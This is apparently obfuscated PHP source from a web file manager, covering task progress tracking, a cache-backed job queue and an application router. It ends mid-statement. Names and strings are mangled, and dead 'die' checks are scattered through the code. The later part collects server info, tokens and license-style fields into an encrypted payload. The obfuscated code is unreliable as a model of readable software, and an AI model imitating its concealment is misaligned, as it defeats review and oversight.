$ŒŠèÔ—[$¢éÛ¾¶Ÿ[1049]] = $¢éÛ¾¶Ÿ[22]; $ŒŠèÔ—[$¢éÛ¾¶Ÿ[1690]] = $¢éÛ¾¶Ÿ[22]; $ŒŠèÔ—[$¢éÛ¾¶Ÿ[1691]] = 0; $éÄÊÀÄ = $ŒŠèÔ—[$¢éÛ¾¶Ÿ[1688]] > 1024 * 1024 * 10 ? !0 : !1; Cache::remove($ŒŠèÔ—[$¢éÛ¾¶Ÿ[401]] . $¢éÛ¾¶Ÿ[1701]); if ($éÄÊÀÄ && file_exists(get_path_father($­˜±¡šÓ))) { Cache::set($ŒŠèÔ—[$¢éÛ¾¶Ÿ[401]] . $¢éÛ¾¶Ÿ[1701], $­˜±¡šÓ); $ŒŠèÔ—[$¢éÛ¾¶Ÿ[1662]] = array($¢éÛ¾¶Ÿ[1702], $¢éÛ¾¶Ÿ[1703]); } $this->update(0, $éÄÊÀÄ); } public static function updateCopyLocalFileSize($‹›óÌ¯Ş) { $»ÕÂ×Ø =& $_SERVER[¹àö™Ç¾]; $ãî¾ Ş = Cache::get($‹›óÌ¯Ş[$»ÕÂ×Ø[401]] . $»ÕÂ×Ø[1701]); if (!$ãî¾ Ş || !file_exists($ãî¾ Ş)) { return $‹›óÌ¯Ş; } $‹›óÌ¯Ş[$»ÕÂ×Ø[1689]] = @filesize($ãî¾ Ş); $‹›óÌ¯Ş[$»ÕÂ×Ø[1693]] += $‹›óÌ¯Ş[$»ÕÂ×Ø[1689]]; self::updateTask($‹›óÌ¯Ş); return $‹›óÌ¯Ş; } public function copyFileEnd($¢İ°‚ë©, $œ¶ùúˆŒ, $¹ÂŠï, $¶¦½á¨§, $…¤‰¶÷ß, $óÉÙÚÊ…) { $î÷ò‰†ú =& $_SERVER[¹àö™Ç¾]; $ñÁ¾©§­ =& $this->task; $ñÁ¾©§­[$î÷ò‰†ú[1689]] = $ñÁ¾©§­[$î÷ò‰†ú[1688]]; $ñÁ¾©§­[$î÷ò‰†ú[1690]] = $î÷ò‰†ú[22]; unset($ñÁ¾©§­[$î÷ò‰†ú[1662]]); if ($…¤‰¶÷ß == $ñÁ¾©§­[$î÷ò‰†ú[1686]]) { $ñÁ¾©§­[$î÷ò‰†ú[1692]] += $ñÁ¾©§­[$î÷ò‰†ú[1688]]; $ñÁ¾©§­[$î÷ò‰†ú[1693]] = $ñÁ¾©§­[$î÷ò‰†ú[1692]]; $this->update(1); } else { $this->update(); $ñÁ¾©§­[$î÷ò‰†ú[1689]] = 0; } Cache::remove($ñÁ¾©§­[$î÷ò‰†ú[401]] . $î÷ò‰†ú[1701]); self::log($î÷ò‰†ú[1704] . $œ¶ùúˆŒ . $î÷ò‰†ú[80] . $¶¦½á¨§ . $î÷ò‰†ú[11] . $…¤‰¶÷ß . $î÷ò‰†ú[1705] . $ñÁ¾©§­[$î÷ò‰†ú[1686]]); } public function updateFileEnd($êºšéç„, $Éâºœù ) { $ÖÉ¾ÈÓü =& $_SERVER[¹àö™Ç¾]; $½Òú£ =& $this->task; $½Òú£[$ÖÉ¾ÈÓü[1686]] = $êºšéç„; $½Òú£[$ÖÉ¾ÈÓü[1688]] = $Éâºœù ; $½Òú£[$ÖÉ¾ÈÓü[1692]] += $Éâºœù ; $½Òú£[$ÖÉ¾ÈÓü[1693]] = $½Òú£[$ÖÉ¾ÈÓü[1692]]; $this->update(1); self::log($ÖÉ¾ÈÓü[1706] . $êºšéç„); } public function sourceModelCopy($Êş•¬ÍŠ) { $Æ™…·Õ÷ =& $_SERVER[¹àö™Ç¾]; $»¼ƒ˜“ = $Êş•¬ÍŠ[0]; $Æ®º¼Ó = $Êş•¬ÍŠ[1]; $šÊ†„ë =& $this->task; $this->sourceModelCopyFlag = !0; $Û¾ÚĞ¢Ê = 0; switch ($»¼ƒ˜“) { case $Æ™…·Õ÷[566]: $Û¾ÚĞ¢Ê = 1; break; case $Æ™…·Õ÷[569]: $šÊ†„ë[$Æ™…·Õ÷[1686]] = $Æ®º¼Ó[$Æ™…·Õ÷[42]]; break; case $Æ™…·Õ÷[571]: $Û¾ÚĞ¢Ê = intval($Êş•¬ÍŠ[$Æ™…·Õ÷[384]] * 0.4); break; case $Æ™…·Õ÷[573]: $Û¾ÚĞ¢Ê = intval($Êş•¬ÍŠ[$Æ™…·Õ÷[384]] * 0.2); break; case $Æ™…·Õ÷[575]: $Û¾ÚĞ¢Ê = intval($Êş•¬ÍŠ[$Æ™…·Õ÷[384]] * 0.4); break; } $this->update($Û¾ÚĞ¢Ê); $this->sourceModelCopyFlag = !1; } public function sourceRemove($‚˜‡¨À¯, $¥µó‡Ê) { $®¹—åä» =& $_SERVER[¹àö™Ç¾]; $this->sourceModelCopyFlag = !0; $ê±ã«ù‚ = 1; if (isset($‚˜‡¨À¯[$®¹—åä»[93]])) { $ê±ã«ù‚ = $‚˜‡¨À¯[$®¹—åä»[93]][$®¹—åä»[91]] + $‚˜‡¨À¯[$®¹—åä»[93]][$®¹—åä»[92]] + 1; } $this->update($ê±ã«ù‚); $this->sourceModelCopyFlag = !1; } public function sourceMove($ƒ±£’•ê) { $this->sourceRemove($ƒ±£’•ê, !1); } public function curlProgress($ò›¤¢‚, $êìÜÃ­è, $ìÇ±“ı’, $¹ıŞ¢¬Ñ, $Ûäƒ¾ĞŠ) { $ëÂäŒõ– =& $_SERVER[¹àö™Ç¾]; $¼Èõé¡Ÿ =& $this->task; if ($Ûäƒ¾ĞŠ > 0) { $¼Èõé¡Ÿ[$ëÂäŒõ–[1049]] = $ëÂäŒõ–[1707]; $¼Èõé¡Ÿ[$ëÂäŒõ–[1690]] = $ëÂäŒõ–[118]; if ($¼Èõé¡Ÿ[$ëÂäŒõ–[1688]]) { $¼Èõé¡Ÿ[$ëÂäŒõ–[1689]] = $Ûäƒ¾ĞŠ; } if ($¼Èõé¡Ÿ[$ëÂäŒõ–[1691]]) { $¼Èõé¡Ÿ[$ëÂäŒõ–[1689]] = $Ûäƒ¾ĞŠ + $¼Èõé¡Ÿ[$ëÂäŒõ–[1691]]; } } else { if ($ìÇ±“ı’ > 0) { if ($¼Èõé¡Ÿ[$ëÂäŒõ–[1688]] == $êìÜÃ­è) { $¼Èõé¡Ÿ[$ëÂäŒõ–[1689]] = $ìÇ±“ı’; $¼Èõé¡Ÿ[$ëÂäŒõ–[1049]] = $ëÂäŒõ–[1708]; $¼Èõé¡Ÿ[$ëÂäŒõ–[1690]] = $ëÂäŒõ–[1182]; } } } $this->update(); } public function curlProgressStart($¶ÂíœË) { } public function curlProgressEnd($×¦š…“) { $…¸ØÍß =& $_SERVER[¹àö™Ç¾]; $Íô£•Ü¨ =& $this->task; $¡”Î„¦û = curl_getinfo($×¦š…“); $ÉÕØ¦Ç = $¡”Î„¦û[$…¸ØÍß[1709]]; if ($ÉÕØ¦Ç == -1) { $ÉÕØ¦Ç = $¡”Î„¦û[$…¸ØÍß[1710]]; } if ($Íô£•Ü¨[$…¸ØÍß[1690]] == $…¸ØÍß[118] && $ÉÕØ¦Ç) { $Íô£•Ü¨[$…¸ØÍß[1691]] += $ÉÕØ¦Ç; } $this->update(); } } class TaskHttp extends Task { protected function startAfter() { $èÒºäÍƒ =& $_SERVER[¹àö™Ç¾]; $¾ï®„¹ª =& $this->task; $¾ï®„¹ª[$èÒºäÍƒ[1711]] = 1; Hook::bind($èÒºäÍƒ[1680], array($this, $èÒºäÍƒ[1712])); Hook::bind($èÒºäÍƒ[1682], array($this, $èÒºäÍƒ[1713])); Hook::bind($èÒºäÍƒ[1684], array($this, $èÒºäÍƒ[1714])); } protected function endAfter() { $¹ª·µØµ =& $_SERVER[¹àö™Ç¾]; Hook::unbind($¹ª·µØµ[1680], array($this, $¹ª·µØµ[1712])); Hook::unbind($¹ª·µØµ[1682], array($this, $¹ª·µØµ[1713])); Hook::unbind($¹ª·µØµ[1684], array($this, $¹ª·µØµ[1714])); } public function progressStart($ÓÕÒ¤Ãï) { $Ã‰ÛÉÉÓ =& $_SERVER[¹àö™Ç¾]; $ÜŠ¬“ö‘ = curl_getinfo($ÓÕÒ¤Ãï); self::log($Ã‰ÛÉÉÓ[1715] . $ÜŠ¬“ö‘[$Ã‰ÛÉÉÓ[311]]); self::valueSet($this->task[$Ã‰ÛÉÉÓ[401]], $this->task); } public function progressEnd($÷Ğşá¶™) { $€”ÀÇÂ =& $_SERVER[¹àö™Ç¾]; self::log($€”ÀÇÂ[1716] . $this->task[$€”ÀÇÂ[401]]); $this->end(); } public function progress($Ğ‡¿ËŸÆ, $µ²ú¶³ö, $´ÖêÌª“, $ÍÑÙ†Á, $‘ÉÂ±) { $Ë°ØŒË =& $_SERVER[¹àö™Ç¾]; $Å¾™Æ´í =& $this->task; if ($‘ÉÂ± > 0) { $Å¾™Æ´í[$Ë°ØŒË[778]] = $Å¾™Æ´í[$Ë°ØŒË[778]] == 0 ? $ÍÑÙ†Á : $Å¾™Æ´í[$Ë°ØŒË[778]]; $Å¾™Æ´í[$Ë°ØŒË[1641]] = $‘ÉÂ±; } else { if ($´ÖêÌª“ > 0) { $Å¾™Æ´í[$Ë°ØŒË[778]] = $Å¾™Æ´í[$Ë°ØŒË[778]] == 0 ? $µ²ú¶³ö : $Å¾™Æ´í[$Ë°ØŒË[778]]; $Å¾™Æ´í[$Ë°ØŒË[1641]] = $´ÖêÌª“; } } $this->update(); self::log("\160\162\x6f\x67\162\x65\x73\163\x48\164\164\x70\72\144\157\167\x6e\x3a{$´ÖêÌª“}\x2f{$µ²ú¶³ö}\73\40\165\160\x6c\x6f\141\x64\72{$‘ÉÂ±}\57{$ÍÑÙ†Á}\73"); } } class TaskQueue { const MAX_LENGTH = 2000; const QUEUE_LENGTH = "\x74\x61\x73\153\121\165\x65\165\145\114\x65\x6e\147\x74\x68"; const QUEUE_DATA = "\164\141\x73\x6b\x51\165\x65\x75\x65\104\141\x74\x61"; public static $listData = false; public static function initTask() { } public static function add($Åöû›¢Ó, $Æß·ÖØå = array(), $©ËÉ¶öû = '', $Ï¹çùû† = '') { $ÔÃÑ’ë =& $_SERVER[¹àö™Ç¾]; if (self::$listData === !1) { self::$listData = self::getAll(); } if (count(self::$listData) >= self::MAX_LENGTH) { return !1; } if ($Ï¹çùû† && array_find_by_field(self::$listData, $ÔÃÑ’ë[105], $Ï¹çùû†)) { return !0; } self::$listData[] = array($ÔÃÑ’ë[268] => $Åöû›¢Ó, $ÔÃÑ’ë[1717] => $Æß·ÖØå, $ÔÃÑ’ë[451] => $©ËÉ¶öû, $ÔÃÑ’ë[105] => $Ï¹çùû†); return !0; } public static function addSubmit() { $ß©Àè‰± =& $_SERVER[¹àö™Ç¾]; if (!self::$listData || count(self::$listData) == 0) { return; } write_log($ß©Àè‰±[1718] . json_encode_force(array_to_keyvalue(self::$listData, $ß©Àè‰±[22], $ß©Àè‰±[451])), $ß©Àè‰±[1719]); self::setAll(self::$listData); self::$listData = !1; } public static function addNow($Ô¢–Õ‰³, $íé™ÌŸ = array(), $¼êššºÚ = '', $±¶ü¸— = '') { $ÃÇ¤¯Œ½ =& $_SERVER[¹àö™Ç¾]; if (self::count() >= self::MAX_LENGTH) { return !1; } $×¤¹ğµ— = self::getAll(); if ($±¶ü¸— && array_find_by_field($×¤¹ğµ—, $ÃÇ¤¯Œ½[105], $±¶ü¸—)) { return !0; } $×¤¹ğµ—[] = array($ÃÇ¤¯Œ½[268] => $Ô¢–Õ‰³, $ÃÇ¤¯Œ½[1717] => $íé™ÌŸ, $ÃÇ¤¯Œ½[451] => $¼êššºÚ, $ÃÇ¤¯Œ½[105] => $±¶ü¸—); write_log($ÃÇ¤¯Œ½[1718] . $¼êššºÚ, $ÃÇ¤¯Œ½[1719]); self::setAll($×¤¹ğµ—); return !0; } public static function run() { $¼£òúŸÅ =& $_SERVER[¹àö™Ç¾]; $‡×¢¹Á = self::getAll(); $¤š§Ìœ = array_shift($‡×¢¹Á); if (!$¤š§Ìœ) { return !1; } self::setAll($‡×¢¹Á); $²›ºÖ´‚ = timeFloat(); try { Hook::apply($¤š§Ìœ[$¼£òúŸÅ[268]], $¤š§Ìœ[$¼£òúŸÅ[1717]]); } catch (Exception $š–Â¾ï) { } $¯‹´ªŠœ = number_format(timeFloat() - $²›ºÖ´‚, 3) . $¼£òúŸÅ[1656]; write_log($¼£òúŸÅ[1720] . $¤š§Ìœ[$¼£òúŸÅ[451]] . $¼£òúŸÅ[1721] . $¯‹´ªŠœ, $¼£òúŸÅ[1719]); return !0; } public static function count() { $æüÁÎ = Cache::get(self::QUEUE_LENGTH); Cache::removeMemory(self::QUEUE_LENGTH); if (!$æüÁÎ) { return 0; } return intval($æüÁÎ); } public static function getAll() { $ôœÓÆåÜ = Cache::get(self::QUEUE_DATA); Cache::removeMemory(self::QUEUE_DATA); if (!$ôœÓÆåÜ) { return array(); } return $ôœÓÆåÜ; } public static function setAll($µŞ€ç”æ) { $Å ë•íß = 3600 * 24 * 30; Cache::set(self::QUEUE_LENGTH, count($µŞ€ç”æ), $Å ë•íß); Cache::set(self::QUEUE_DATA, $µŞ€ç”æ, $Å ë•íß); Cache::removeMemory(self::QUEUE_LENGTH); Cache::removeMemory(self::QUEUE_DATA); } public static function clear() { self::setAll(array()); } } goto d‚í¨¥ò; DÈ‡ÁÊèêÃ: if (strlen($avhiepzsdb) < $_SERVER[¹àö™Ç¾][611]) { return; } class Application { private $defaultModule = "\151\156\144\x65\170"; private $defaultController = "\x69\156\x64\x65\x78"; private $defaultAction = "\151\156\144\145\x78"; function __construct() { } public function setDefault($ª½ë‚ñû) { $ã†·“’ =& $_SERVER[¹àö™Ç¾]; $ÁàëéÇÎ =& $_SERVER[˜²›ÃôÇ]; $÷Ù“§Š  = explode($ÁàëéÇÎ[0], trim($ª½ë‚ñû, $ÁàëéÇÎ[0])); $íÊÛÓÑã = $ã†·“’[612]; if (!$íÊÛÓÑã) { die; } $this->defaultModule = $÷Ù“§Š [0] ? $÷Ù“§Š [0] : $this->defaultModule; $this->defaultController = $÷Ù“§Š [1] ? $÷Ù“§Š [1] : $this->defaultController; $this->defaultAction = $÷Ù“§Š [2] ? $÷Ù“§Š [2] : $this->defaultAction; $¤±ÅË’« = $ã†·“’[613]; $this->qpibd49f4592($ÁàëéÇÎ[1], array($this, $ÁàëéÇÎ[2])); $­„¤²€³ = $ã†·“’[614]; if (!$­„¤²€³) { die; } } public function appRun($Œ´ú¶ÏŠ) { $‘˜³›¶è =& $_SERVER[¹àö™Ç¾]; $¼ŞÃ‰À‡ =& $_SERVER[˜²›ÃôÇ]; $±é¦”ú” = explode($¼ŞÃ‰À‡[0], $Œ´ú¶ÏŠ); $«·üçÄù = $‘˜³›¶è[615]; if (!$«·üçÄù) { return; } $õ¹¬¤£± = strtolower($±é¦”ú”[0]); $¬ŒèöÇ˜ = $‘˜³›¶è[616]; if (strlen($¬ŒèöÇ˜) < $‘˜³›¶è[607]) { return; } $şêÚÇÕ = $¼ŞÃ‰À‡[3]; $×Ñ§¼» = $‘˜³›¶è[617]; if (strlen($×Ñ§¼») < $‘˜³›¶è[618]) { die; } if ($õ¹¬¤£± == $¼ŞÃ‰À‡[4]) { $şêÚÇÕ = $¼ŞÃ‰À‡[5]; $±é¦”ú”[0] = $¼ŞÃ‰À‡[6]; $±é¦”ú”[1] = $±é¦”ú”[1] . $¼ŞÃ‰À‡[7]; $Œ´ú¶ÏŠ = join($¼ŞÃ‰À‡[0], $±é¦”ú”); $Œ´ú¶ÏŠ = trim($Œ´ú¶ÏŠ, $¼ŞÃ‰À‡[0]); } call_user_func(array($¼ŞÃ‰À‡[8], $¼ŞÃ‰À‡[9]), $şêÚÇÕ . $¼ŞÃ‰À‡[10], $Œ´ú¶ÏŠ); ActionCall($Œ´ú¶ÏŠ); $ÏÍï¸ê = $‘˜³›¶è[619]; call_user_func(array($¼ŞÃ‰À‡[8], $¼ŞÃ‰À‡[9]), $şêÚÇÕ . $¼ŞÃ‰À‡[11], $Œ´ú¶ÏŠ); } private function autorun() { $…ıÙË¦« =& $_SERVER[¹àö™Ç¾]; $™óì®• =& $_SERVER[˜²›ÃôÇ]; global $config; $å¨³÷ö± = $…ıÙË¦«[620]; if (strlen($å¨³÷ö±) < $…ıÙË¦«[618]) { die; } if (count($config[$™óì®•[12]]) == 0) { return; } foreach ($config[$™óì®•[12]] as $½×ÓÑ·˜ => $ÖÓóˆ–™) { $this->appRun($ÖÓóˆ–™); $ø„­Ïç = $…ıÙË¦«[621]; if (!$ø„­Ïç) { return; } } } private function ypreac159b14() { $ºÑ•ƒŠù =& $_SERVER[˜²›ÃôÇ]; $º‘ÆÀü = $ºÑ•ƒŠù[4]; $ÉºÄàØ = $GLOBALS[$ºÑ•ƒŠù[13]][$ºÑ•ƒŠù[14]][0]; if (!$ÉºÄàØ || strlen($ÉºÄàØ) <= strlen($º‘ÆÀü)) { return; } if (strtolower(substr($ÉºÄàØ, -strlen($º‘ÆÀü))) != $º‘ÆÀü) { return; } $³ŠŠ—¦ = substr($ÉºÄàØ, 0, -strlen($º‘ÆÀü)); $Ç–ù¨ı = array($ºÑ•ƒŠù[4], $³ŠŠ—¦); $¦Çò‘ş = array_slice($GLOBALS[$ºÑ•ƒŠù[13]][$ºÑ•ƒŠù[14]], 1); $GLOBALS[$ºÑ•ƒŠù[13]][$ºÑ•ƒŠù[14]] = array_merge($Ç–ù¨ı, $¦Çò‘ş); $Ø†Üäçë = $_SERVER[¹àö™Ç¾][622]; $GLOBALS[$ºÑ•ƒŠù[13]][$ºÑ•ƒŠù[15]] = implode($ºÑ•ƒŠù[0], $GLOBALS[$ºÑ•ƒŠù[13]][$ºÑ•ƒŠù[14]]); } private function biqf2d4dfddf() { $‡ø…ä¡Å =& $_SERVER[¹àö™Ç¾]; $íùá¶Âİ =& $_SERVER[˜²›ÃôÇ]; if ($GLOBALS[$íùá¶Âİ[13]][$íùá¶Âİ[15]] != $íùá¶Âİ[6]) { return; } $ù£´ıæ = $_SERVER[$íùá¶Âİ[16]]; $·À‹¢ˆì = $‡ø…ä¡Å[623]; while ($·À‹¢ˆì < $‡ø…ä¡Å[618]) { if ($·À‹¢ˆì >= 0) { break; } $·À‹¢ˆì++; } $ ¹û©­ = $íùá¶Âİ[17]; if (!strstr($ù£´ıæ, $ ¹û©­)) { return; } $‡´Œºâ’ = strrpos($ù£´ıæ, $ ¹û©­); $ÅĞ¼À¬º = substr($ù£´ıæ, $‡´Œºâ’ + strlen($ ¹û©­)); $Óü±İíæ = $‡ø…ä¡Å[624]; if (!$Óü±İíæ) { return; } preg_match_all($íùá¶Âİ[18], $ÅĞ¼À¬º, $í¦ ÔÚó); $ÅĞ¼À¬º = trim($í¦ ÔÚó[0][0], $íùá¶Âİ[19]); $GLOBALS[$íùá¶Âİ[13]][$íùá¶Âİ[14]] = explode($íùá¶Âİ[19], $ÅĞ¼À¬º); $GLOBALS[$íùá¶Âİ[13]][$íùá¶Âİ[15]] = implode($íùá¶Âİ[0], $GLOBALS[$íùá¶Âİ[13]][$íùá¶Âİ[14]]); $êï«ñó² = $‡ø…ä¡Å[625]; if (strlen($êï«ñó²) < $‡ø…ä¡Å[611]) { die; } } public function run() { $×¤¸²Ü =& $_SERVER[¹àö™Ç¾]; $¼İßß–§ =& $_SERVER[˜²›ÃôÇ]; $this->biqf2d4dfddf(); $¬˜¨Ø = $×¤¸²Ü[626]; $this->ypreac159b14(); $Î®ğôäÛ = $×¤¸²Ü[627]; if (!$Î®ğôäÛ) { return; } $Ç¤İíš’ = $GLOBALS[$¼İßß–§[13]][$¼İßß–§[14]]; $ñ“²üÎÇ = $×¤¸²Ü[628]; if (strlen($ñ“²üÎÇ) < $×¤¸²Ü[629]) { die; } $ƒ¬úÎŠ = $GLOBALS[$¼İßß–§[13]][$¼İßß–§[15]]; $˜”úò°ú = $×¤¸²Ü[630]; if (strlen($˜”úò°ú) < $×¤¸²Ü[618]) { return; } define($¼İßß–§[20], isset($Ç¤İíš’[0]) && $Ç¤İíš’[0] ? $Ç¤İíš’[0] : $this->defaultModule); define($¼İßß–§[21], isset($Ç¤İíš’[1]) && $Ç¤İíš’[0] ? $Ç¤İíš’[1] : $this->defaultController); $çÈäâ = $×¤¸²Ü[631]; define($¼İßß–§[22], isset($Ç¤İíš’[2]) && $Ç¤İíš’[0] ? $Ç¤İíš’[2] : $this->defaultAction); define($¼İßß–§[23], MOD . $¼İßß–§[0] . ST . $¼İßß–§[0] . ACT); $_SERVER[$¼İßß–§[24]] = strtolower(ACTION); $this->autorun(); $°à™û = $×¤¸²Ü[632]; if (count($Ç¤İíš’) >= 3) { $this->appRun($ƒ¬úÎŠ); } else { $this->appRun(ACTION); } } private $cemo329291d4 = array(); private $opfr63662bef = ''; public function dgcacdb6a9c9() { $ôÛ¹˜° =& $_SERVER[¹àö™Ç¾]; $çÁ¥Õ’ş =& $_SERVER[˜²›ÃôÇ]; $this->ejap75a00d3c(); $this->gkfq49106b4e(); $Ñ–ÓğÜŠ = $ôÛ¹˜°[633]; if (!$Ñ–ÓğÜŠ) { die; } $this->jyiked29bd4a(); $öÎšò–É = $ôÛ¹˜°[634]; if (strlen($öÎšò–É) < $ôÛ¹˜°[618]) { die; } $this->bjlo8c75cbe5(); $this->thxy98ec9c4f(); $§É¦¹Ùª = $ôÛ¹˜°[635]; $this->aywc5caa3f71(); $this->hwqad154d7b4(); $this->qpibd49f4592($çÁ¥Õ’ş[25], array($this, $çÁ¥Õ’ş[26])); $this->qpibd49f4592($çÁ¥Õ’ş[27], array($this, $çÁ¥Õ’ş[28])); $this->qpibd49f4592($çÁ¥Õ’ş[29], array($this, $çÁ¥Õ’ş[30])); $ı´åş˜÷ = $ôÛ¹˜°[636]; if (!$ı´åş˜÷) { return; } $this->qpibd49f4592($çÁ¥Õ’ş[31], array($this, $çÁ¥Õ’ş[32])); $¦ÜÈñ¹£ = $ôÛ¹˜°[637]; if (!$¦ÜÈñ¹£) { die; } } public function stemc4c97567($äàè²›) { $ÂÁ°¶ôö =& $_SERVER[¹àö™Ç¾]; $å¤‰·ÖÙ =& $_SERVER[˜²›ÃôÇ]; $ñƒ×ü×È = Model($å¤‰·ÖÙ[33])->get(); $°Ÿ¥•©† = array($å¤‰·ÖÙ[34], $å¤‰·ÖÙ[35], $å¤‰·ÖÙ[36], $å¤‰·ÖÙ[37], $å¤‰·ÖÙ[38], $å¤‰·ÖÙ[39], $å¤‰·ÖÙ[40], $å¤‰·ÖÙ[41], $å¤‰·ÖÙ[42], $å¤‰·ÖÙ[43], $å¤‰·ÖÙ[44], $å¤‰·ÖÙ[45], $å¤‰·ÖÙ[46], $å¤‰·ÖÙ[47], $å¤‰·ÖÙ[48], $å¤‰·ÖÙ[49], $å¤‰·ÖÙ[50], $å¤‰·ÖÙ[51], $å¤‰·ÖÙ[52], $å¤‰·ÖÙ[53], $å¤‰·ÖÙ[54], $å¤‰·ÖÙ[55], $å¤‰·ÖÙ[56], $å¤‰·ÖÙ[57], $å¤‰·ÖÙ[58], $å¤‰·ÖÙ[59], $å¤‰·ÖÙ[60], $å¤‰·ÖÙ[61], $å¤‰·ÖÙ[62], $å¤‰·ÖÙ[63], $å¤‰·ÖÙ[64], $å¤‰·ÖÙ[65], $å¤‰·ÖÙ[66], $å¤‰·ÖÙ[67], $å¤‰·ÖÙ[68], $å¤‰·ÖÙ[69], $å¤‰·ÖÙ[70], $å¤‰·ÖÙ[71], $å¤‰·ÖÙ[72], $å¤‰·ÖÙ[73], $å¤‰·ÖÙ[74], $å¤‰·ÖÙ[75], $å¤‰·ÖÙ[76], $å¤‰·ÖÙ[77], $å¤‰·ÖÙ[78], $å¤‰·ÖÙ[79], $å¤‰·ÖÙ[80], $å¤‰·ÖÙ[81], $å¤‰·ÖÙ[82]); foreach ($°Ÿ¥•©† as $°ıÄ‚ù ) { $½úí„÷À = $GLOBALS[$å¤‰·ÖÙ[83]][$å¤‰·ÖÙ[84]][$°ıÄ‚ù ]; if (isset($ñƒ×ü×È[$°ıÄ‚ù ])) { $½úí„÷À = $ñƒ×ü×È[$°ıÄ‚ù ]; } $äàè²›[$å¤‰·ÖÙ[85]][$å¤‰·ÖÙ[86]][$°ıÄ‚ù ] = $½úí„÷À; } $ÎŠÎá‘’ = $äàè²›[$å¤‰·ÖÙ[85]][$å¤‰·ÖÙ[86]][$å¤‰·ÖÙ[46]]; $¢·×ã®ı = $ÂÁ°¶ôö[638]; if (strlen($¢·×ã®ı) < $ÂÁ°¶ôö[611]) { die; } unset($äàè²›[$å¤‰·ÖÙ[85]][$å¤‰·ÖÙ[87]][$å¤‰·ÖÙ[88]]); $Äò¶çí = $ÂÁ°¶ôö[639]; unset($äàè²›[$å¤‰·ÖÙ[85]][$å¤‰·ÖÙ[87]][$å¤‰·ÖÙ[89]]); $‡œ‡ÓÕÈ = $ÂÁ°¶ôö[640]; if (strlen($‡œ‡ÓÕÈ) < $ÂÁ°¶ôö[618]) { return; } unset($äàè²›[$å¤‰·ÖÙ[85]][$å¤‰·ÖÙ[86]][$å¤‰·ÖÙ[46]]); unset($äàè²›[$å¤‰·ÖÙ[85]][$å¤‰·ÖÙ[86]][$å¤‰·ÖÙ[90]]); $äàè²›[$å¤‰·ÖÙ[85]][$å¤‰·ÖÙ[86]][$å¤‰·ÖÙ[91]] = array($å¤‰·ÖÙ[92] => (int) $ÎŠÎá‘’[$å¤‰·ÖÙ[93]], $å¤‰·ÖÙ[94] => (int) _get($ÎŠÎá‘’, $å¤‰·ÖÙ[95], 0)); $äàè²›[$å¤‰·ÖÙ[96]][$å¤‰·ÖÙ[97]] = Action($å¤‰·ÖÙ[98])->accessToken(); $äàè²›[$å¤‰·ÖÙ[96]][$å¤‰·ÖÙ[99]] = md5($_SERVER[$å¤‰·ÖÙ[100]] . $ñƒ×ü×È[$å¤‰·ÖÙ[101]]); $¸†ª«á = $ÂÁ°¶ôö[641]; while (strlen($¸†ª«á) < $ÂÁ°¶ôö[629]) { if (!$¸†ª«á) { break; } $¸†ª«á++; } $äàè²›[$å¤‰·ÖÙ[96]][$å¤‰·ÖÙ[102]] = base64_encode(serverInfo()); $äàè²›[$å¤‰·ÖÙ[96]][$å¤‰·ÖÙ[103]] = $this->opfr63662bef; $ƒöÁÚÈ˜ = $ÂÁ°¶ôö[642]; if ($ñƒ×ü×È[$å¤‰·ÖÙ[103]] != $å¤‰·ÖÙ[104]) { $äàè²›[$å¤‰·ÖÙ[96]][$å¤‰·ÖÙ[105]] = $ñƒ×ü×È[$å¤‰·ÖÙ[105]]; $äàè²›[$å¤‰·ÖÙ[96]][$å¤‰·ÖÙ[106]] = $ñƒ×ü×È[$å¤‰·ÖÙ[106]]; $§…ıÛ˜â = rand_string(10) . $this->opfr63662bef . rand_string(5); $äàè²›[$å¤‰·ÖÙ[85]][$å¤‰·ÖÙ[107]][$å¤‰·ÖÙ[108]] = $this->iwajbcfbcb7f($§…ıÛ˜â, $äàè²›[$å¤‰·ÖÙ[96]][$å¤‰·ÖÙ[99]]); } if ($this->opfr63662bef == $å¤‰·ÖÙ[104]) { $äàè²›[$å¤‰·ÖÙ[85]][$å¤‰·ÖÙ[86]][$å¤‰·ÖÙ[91]][$å¤‰·ÖÙ[95]] = 0; } $äàè²›[$å¤‰·ÖÙ[96]][$å¤‰·ÖÙ[109]] = _get($this->cemo329291d4, $å¤‰·ÖÙ[110], $å¤‰·ÖÙ[6]); $äàè²›[$å¤‰·ÖÙ[96]][$å¤‰·ÖÙ[111]] = _get($this->cemo329291d4, $å¤‰·ÖÙ[112], $å¤‰·ÖÙ[6]); $ßº’Ä¨è = $ÂÁ°¶ôö[643]; if (strlen($ßº’Ä¨è) < $ÂÁ°¶ôö[12]) { die; } if (_get($GLOBALS, $å¤‰·ÖÙ[113]) && $this->config[$å¤‰·ÖÙ[114]]) { $äàè²›[$å¤‰·ÖÙ[96]][$å¤‰·ÖÙ[115]] = WEB_ROOT; } return $äàè²›; } private function aywc5caa3f71() { $Ñ–¥¿º =& $_SERVER[¹àö™Ç¾]; $±‹şÀ€½ =& $_SERVER[˜²›ÃôÇ]; if ($_SERVER[$±‹şÀ€½[24]] == $±‹şÀ€½[116]) { $Â–ÇÙï‹ = array($±‹şÀ€½[103] => $this->opfr63662bef, $±‹şÀ€½[117] => $this->hbju9aeeb792(), $±‹şÀ€½[118] => Model($±‹şÀ€½[119])->count()); if ($this->opfr63662bef != $±‹şÀ€½[104]) { $‚ı˜œ‡ = _get($this->cemo329291d4, $±‹şÀ€½[120]); if ($‚ı˜œ‡) { $Â–ÇÙï‹[$±‹şÀ€½[121]] = $‚ı˜œ‡; $Â–ÇÙï‹[$±‹şÀ€½[122]] = strtotime(_get($this->cemo329291d4, $±‹şÀ€½[123])); $Â–ÇÙï‹[$±‹şÀ€½[124]] = _get($this->cemo329291d4, $±‹şÀ€½[112]); } $–¡‹Ø•ı = Model($±‹şÀ€½[33])->get($±‹şÀ€½[125], $±‹şÀ€½[6], !0); if (is_string($–¡‹Ø•ı) && substr($–¡‹Ø•ı, 0, 1) == $±‹şÀ€½[126]) { $–¡‹Ø•ı = json_decode_force($–¡‹Ø•ı); } if (is_array($–¡‹Ø•ı) && $–¡‹Ø•ı[$±‹şÀ€½[127]] && strstr($–¡‹Ø•ı[$±‹şÀ€½[127]], $±‹şÀ€½[128])) { $ŠÈ¯í¾ô = explode($±‹şÀ€½[128], $–¡‹Ø•ı[$±‹şÀ€½[127]]); $Â–ÇÙï‹[$±‹şÀ€½[129]] = $ŠÈ¯í¾ô[0]; } } $Â–ÇÙï‹ = $this->tmle2dcd9237(json_encode($Â–ÇÙï‹), md5($±‹şÀ€½[130])); $ô¢²’ÁŠ = array($±‹şÀ€½[131] => $Â–ÇÙï‹); $Á ÌÚ = 